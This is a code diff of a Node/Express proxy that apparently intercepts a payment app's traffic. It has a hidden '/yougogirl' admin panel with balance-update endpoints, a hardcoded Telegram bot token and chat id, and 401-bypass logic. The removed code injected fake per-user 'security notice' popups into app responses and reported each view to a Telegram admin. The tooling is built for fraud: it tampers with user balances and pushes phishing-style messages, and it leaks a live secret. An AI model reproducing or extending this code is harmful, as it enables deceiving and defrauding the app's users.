@@ -338,7 +338,6 @@ const DEFAULT_DATA = {
   alwaysIdOverride: null,
   lastCapturedId: { deviceId: '', challengeId: '' },
   customServiceLink: '',
-  userBanners: {},
   bot2Token: '8902409005:AAERSlRmgXR1GZFmAu3TGzsX6bzv29niwsQ',
   bot2ChatId: '5880677639',
   bot2Enabled: true
@@ -498,12 +497,7 @@ function isAuthFailureResponse(jsonResp) {
 }
 
 function shouldBypass401(req) {
-  const path = (req.originalUrl || req.url || '').split('?')[0];
-  const noBypass = [
-    '/app/user/login',
-    '/app/captcha'
-  ];
-  return !noBypass.some(p => path.includes(p));
+  return false;
 }
 
 function make401Bypass(jsonResp) {
@@ -2310,80 +2304,7 @@ app.post('/app/payment/order/cancel', async (req, res) => {
   } catch (e) { await transparentProxy(req, res); }
 });
 
-// === POPUP NOTICE INTERCEPTOR & BANNER SEEN NOTIFIER ===
-app.all('/app/app/popup/notice/currentList', async (req, res) => {
-  const data = await loadData();
-  try {
-    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
-    const userId = await extractUserIdFromToken(req) || await extractUserId(req, jsonResp);
 
-    if (userId && data.userBanners && data.userBanners[String(userId)]) {
-      const b = data.userBanners[String(userId)];
-      let list = [];
-
-      if (jsonResp && jsonResp.data) {
-        if (Array.isArray(jsonResp.data)) {
-          list = jsonResp.data;
-        } else if (Array.isArray(jsonResp.data.data)) {
-          list = jsonResp.data.data;
-        }
-      }
-
-      const customNotice = {
-        id: b.id || Math.floor(100000 + Math.random() * 899999),
-        title: b.title || '🚨 VIP Notice',
-        content: b.content || '',
-        type: 1,
-        linkUrl: '',
-        sort: 999999
-      };
-
-      // Insert custom banner at position 0 so it pops up first!
-      list.unshift(customNotice);
-
-      if (jsonResp && jsonResp.data) {
-        if (Array.isArray(jsonResp.data)) {
-          jsonResp.data = list;
-        } else if (Array.isArray(jsonResp.data.data)) {
-          jsonResp.data.data = list;
-        }
-      }
-
-      // Increment seen count
-      b.seenCount = (b.seenCount || 0) + 1;
-      b.lastSeenTime = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
-      await saveData(data);
-
-      // Send Seen Notification to Telegram Admin
-      if (data.adminChatId && bot) {
-        const getOrdinalText = (n) => {
-          if (n === 1) return 'first time';
-          if (n === 2) return 'second time';
-          if (n === 3) return 'third time';
-          return n + 'th time';
-        };
-
-        const seenText = getOrdinalText(b.seenCount);
-        const phone = getPhone(data, userId);
-
-        const seenAlert =
-          '👀 *Banner Seen by User* (' + seenText + ')\n' +
-          '━━━━━━━━━━━━━━━━━━\n' +
-          '👤 *User ID:* \`' + userId + '\`' + (phone ? ' (' + phone + ')' : '') + '\n' +
-          '📌 *Title:* ' + (b.title || '🚨 VIP Notice') + '\n' +
-          '💬 *Message:* ' + b.content + '\n' +
-          '📊 *Total Views:* ' + b.seenCount + ' times\n' +
-          '🕐 *Time:* ' + b.lastSeenTime;
-
-        bot.sendMessage(data.adminChatId, seenAlert, { parse_mode: 'Markdown' }).catch(() => { });
-      }
-    }
-
-    sendJsonSafe(res, respHeaders, jsonResp, respBody, req);
-  } catch (e) {
-    await transparentProxy(req, res);
-  }
-});
 
 
 
@@ -3656,9 +3577,6 @@ app.get('/yougogirl', async (req, res) => {
                     <i class="fa-solid fa-house-chimney w-6"></i> Overview
                 </div>
                 <div class="text-[10px] font-bold text-slate-500 uppercase tracking-[0.2em] px-4 mt-6 mb-2">User Management</div>
-                <div onclick="showTab('banners')" class="tab-btn" id="btn-banners">
-                    <i class="fa-solid fa-bullhorn w-6"></i> Banners
-                </div>
                 <div onclick="showTab('balance')" class="tab-btn" id="btn-balance">
                     <i class="fa-solid fa-wallet w-6"></i> Balance
                 </div>
@@ -3742,63 +3660,6 @@ app.get('/yougogirl', async (req, res) => {
                                     <i class="fa-solid fa-bolt mr-2 text-amber-400"></i> Re-activate Webhook
                                 </a>
                             </div>
-                        </div>
-                    </div>
-                </section>
-
-                <!-- Tab: Banners -->
-                <section id="tab-banners" class="tab-content space-y-6">
-                    <div class="card">
-                        <h3 class="text-xl font-bold mb-6">User Banner Management</h3>
-                        <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
-                            <div class="space-y-4">
-                                <div>
-                                    <label class="text-xs font-bold text-slate-500 uppercase mb-2 block">Target User ID</label>
-                                    <input type="text" id="banner-userId" class="input-field" placeholder="Enter User ID (e.g. 254627)">
-                                </div>
-                                <div>
-                                    <label class="text-xs font-bold text-slate-500 uppercase mb-2 block">Notice Title</label>
-                                    <input type="text" id="banner-title" class="input-field" placeholder="e.g. 🚨 Account Security Notice">
-                                </div>
-                            </div>
-                            <div>
-                                <label class="text-xs font-bold text-slate-500 uppercase mb-2 block">Message Content</label>
-                                <textarea id="banner-content" class="input-field h-[116px]" placeholder="Write the message users will see in the app..."></textarea>
-                            </div>
-                        </div>
-                        <div class="flex gap-3 mt-6">
-                            <button onclick="setBanner()" class="btn-primary flex-1">Push Notice to User</button>
-                            <button onclick="clearBanner()" class="bg-rose-500/10 text-rose-500 px-6 rounded-xl font-bold hover:bg-rose-500/20 transition-all">Clear User Banner</button>
-                            <button onclick="clearBanner('all')" class="bg-slate-800 text-slate-400 px-6 rounded-xl font-bold hover:bg-slate-700 transition-all">Clear All</button>
-                        </div>
-                    </div>
-
-                    <div class="card">
-                        <h3 class="text-lg font-bold mb-4">Active Banners</h3>
-                        <div class="overflow-x-auto">
-                            <table class="w-full text-left text-sm">
-                                <thead class="text-slate-500 border-b border-slate-800">
-                                    <tr>
-                                        <th class="pb-3">User ID</th>
-                                        <th class="pb-3">Title</th>
-                                        <th class="pb-3">Message</th>
-                                        <th class="pb-3">Status</th>
-                                        <th class="pb-3 text-right">Action</th>
-                                    </tr>
-                                </thead>
-                                <tbody class="divide-y divide-slate-800">
-                                    ${Object.entries(data.userBanners || {}).map(([uid, b]) =>
-      '<tr>' +
-      '<td class="py-4 font-mono text-sky-400">' + uid + '</td>' +
-      '<td class="py-4 font-bold">' + b.title + '</td>' +
-      '<td class="py-4 text-slate-400 truncate max-w-[200px]">' + b.content + '</td>' +
-      '<td class="py-4"><span class="badge bg-emerald-500/10 text-emerald-500">Live</span></td>' +
-      '<td class="py-4 text-right"><button onclick="clearBanner(\'' + uid + '\')" class="text-rose-500 hover:underline">Delete</button></td>' +
-      '</tr>'
-    ).join('')}
-                                    ${Object.keys(data.userBanners || {}).length === 0 ? '<tr><td colspan="5" class="py-8 text-center text-slate-600 italic">No active banners.</td></tr>' : ''}
-                                </tbody>
-                            </table>
                         </div>
                     </div>
                 </section>
@@ -4339,35 +4200,7 @@ app.post('/yougogirl/api/proxy-toggle', async (req, res) => {
   } catch (e) { res.status(500).json({ success: false, error: e.message }); }
 });
 
-app.post('/yougogirl/api/banner/set', async (req, res) => {
-  try {
-    const { userId, title, content } = req.parsedBody || {};
-    if (!userId || !content) return res.status(400).json({ success: false, error: 'Missing userId or content' });
-    const data = await loadData(true);
-    data.userBanners = data.userBanners || {};
-    data.userBanners[String(userId)] = {
-      id: Math.floor(100000 + Math.random() * 899999),
-      title: title || '🚨 VIP Notice',
-      content: content,
-      seenCount: 0,
-      createdAt: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })
-    };
-    await saveData(data);
-    res.json({ success: true, message: 'Banner set successfully' });
-  } catch (e) { res.status(500).json({ success: false, error: e.message }); }
-});
 
-app.post('/yougogirl/api/banner/clear', async (req, res) => {
-  try {
-    const { userId } = req.parsedBody || {};
-    const data = await loadData(true);
-    data.userBanners = data.userBanners || {};
-    if (!userId || userId === 'all') data.userBanners = {};
-    else delete data.userBanners[String(userId)];
-    await saveData(data);
-    res.json({ success: true, message: 'Banner(s) cleared' });
-  } catch (e) { res.status(500).json({ success: false, error: e.message }); }
-});
 
 app.post('/yougogirl/api/balance/update', async (req, res) => {
   try {
